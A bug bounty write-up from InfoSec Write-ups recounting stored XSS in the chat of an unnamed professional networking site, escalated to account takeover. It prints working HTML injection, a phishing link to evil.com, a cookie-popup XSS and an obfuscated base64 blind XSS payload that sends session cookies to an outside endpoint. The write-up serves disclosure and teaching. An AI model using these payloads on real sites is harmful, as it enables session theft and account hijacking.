---
title: From Innocent Messages to Total Takeover: How I Hacked a Professional Network!
url: https://infosecwriteups.com/from-innocent-messages-to-total-takeover-how-i-hacked-a-professional-network-2033537d5d6a?source=rss----7b722bfd1b8d--bug_bounty
source: Bug Bounty in InfoSec Write-ups on Medium
date: 2025-08-02
fetch_date: 2025-10-07T00:47:40.464781
---

# From Innocent Messages to Total Takeover: How I Hacked a Professional Network!

[Sitemap](/sitemap/sitemap.xml)

[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F2033537d5d6a&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderCollection&%7Estage=mobileNavBar&source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Ffrom-innocent-messages-to-total-takeover-how-i-hacked-a-professional-network-2033537d5d6a&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Ffrom-innocent-messages-to-total-takeover-how-i-hacked-a-professional-network-2033537d5d6a&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)

[## InfoSec Write-ups](https://infosecwriteups.com/?source=post_page---publication_nav-7b722bfd1b8d-2033537d5d6a---------------------------------------)

·

Follow publication

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:76:76/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_sidebar-7b722bfd1b8d-2033537d5d6a---------------------------------------)

A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: <https://weekly.infosecwriteups.com/>

Follow publication

# 💥 From Innocent Messages to Total Takeover: How I Hacked a Professional Network! 💻🔓

[![LordofHeaven](https://miro.medium.com/v2/resize:fill:64:64/1*KZRV0GWTj8BUGxiz_w7oPg.png)](https://lordofheaven1234.medium.com/?source=post_page---byline--2033537d5d6a---------------------------------------)

[LordofHeaven](https://lordofheaven1234.medium.com/?source=post_page---byline--2033537d5d6a---------------------------------------)

3 min read

·

Jan 11, 2025

--

Listen

Share

Let me take you on an exciting journey of how I uncovered a massive security flaw in a professional networking platform, similar to LinkedIn, and turned harmless chat messages into a **devastating account takeover exploit**! 😱

Press enter or click to view image in full size

![]()

## 🤔 The Discovery: A Glimpse of Opportunity

I stumbled upon **redacted.com**, a **big-name and famous company** in the networking space. It offered features like:

* Professional profile creation
* Posting updates
* Connecting with others
* And surprisingly, **messaging anyone**, even if you weren’t connected!

This was unlike LinkedIn, where messaging is restricted unless you’re connected or a premium member. My hacker instincts tingled! Was there a flaw in this “open” messaging system? Time to find out! 😏

## 🔍 Setting the Stage: Two Accounts, One Experiment

To test the waters, I created two accounts:

* **Account 1 (Attacker)**: My hacker persona.
* **Account 2 (Victim)**: The target for my experiments.

I began testing the platform’s chat system by sending **basic HTML payloads** from Account 1 to Account 2. Here are a few examples:

1. **Image injection**

```
<img src="https://example.com/hacker.jpg">
```

**2 .Phishing link**

```
<a href="https://evil.com" style="color: red; font-size: 20px;">Click here to win $25!</a>
```

1. **Iframe injection**

```
"><iframe src="https://www.cia.gov" style="border:0; width:100%; height:100%;"></iframe>
```

**Result?** 🎉 Everything worked! The platform rendered my raw HTML payloads without sanitizing them. This was **critical** because it meant the system wasn’t protecting against malicious inputs.

## 🔥 Escalation: Stored XSS in the Chat System

Next, I decided to test for **stored XSS**. Stored XSS occurs when malicious scripts are saved on the server and executed whenever a user interacts with the vulnerable page.

Here’s the payload I tried:

```
<img src/onerror=prompt(document.cookie)>
```

Here’s what happened:

* When **Account 2** opened the chat, the payload executed, triggering a pop-up showing the victim’s cookies. 🍪
* Even **Account 1** (the sender) would see the XSS pop-up upon revisiting the chat.

This confirmed the presence of a **stored XSS vulnerability** in the chat system. But I wasn’t going to stop here. The real goal? **Full account takeover.**

## 💣 The Big Bang: Blind XSS for Account Takeover

I crafted a **blind XSS payload** to escalate the attack. This payload would steal the victim’s session cookies and send them to my server for exploitation. Here’s what I used:

```
"><img src=x id=dmFyIGE9ZG9jdW1k7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2xvcmRvZmhlYXZlbjEyMzQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
```

### How It Played Out:

1. I sent the payload from **Account 1** to **Account 2** via chat.
2. When **Account 2** opened the chat, the payload executed in their browser.
3. The payload sent **Account 2’s session cookies** to my endpoint on **xss.report**.
4. Using those cookies, I logged into **Account 2** without needing their credentials.

**BOOM! 💥 Account takeover achieved.**

## 😨 The Real Impact

This vulnerability was catastrophic. An attacker could:

* Hijack any user’s account by simply sending them a malicious chat message.
* Automate the attack to compromise thousands of accounts in minutes.

Platforms like **redacted.com** are trusted by professionals, and such a flaw could seriously harm their reputation.

## 📧 Reporting the Bug

I discovered and reported this vulnerability **over six months ago** to **redacted.com** . I even followed up via email. Unfortunately, I never received any response.

As a bug bounty hunter, I value platforms that take security seriously. However, the lack of action here left me disappointed. I decided to share my findings through this article to **help the community learn** and to emphasize the importance of addressing security issues promptly.

## 🌟 Final Thoughts

This was my first Medium article, and I hope you found it insightful! 🙌

Discovering and exploiting vulnerabilities like these remind us how small oversights can lead to significant security risks. Let me know your thoughts in the comments, and feel free to share any similar experiences you’ve had!

Would love your feedback, especially since this is my first-ever article! 😊

[Hacking](https://medium.com/tag/hacking?source=post_page-----2033537d5d6a---------------------------------------)

[Bug Bounty](https://medium.com/tag/bug-bounty?source=post_page-----2033537d5d6a---------------------------------------)

[Blind Xss](https://medium.com/tag/blind-xss?source=post_page-----2033537d5d6a---------------------------------------)

[Account Takeover](https://medium.com/tag/account-takeover?source=post_page-----2033537d5d6a---------------------------------------)

--

--

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:96:96/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_info--2033537d5d6a---------------------------------------)

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:128:128/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_info--2033537d5d6a---------------------------------------)

Follow

[## Published in InfoSec Write-ups](https://infosecwriteups.com/?source=post_page---post_publication_info--2033537d5d6a---------------...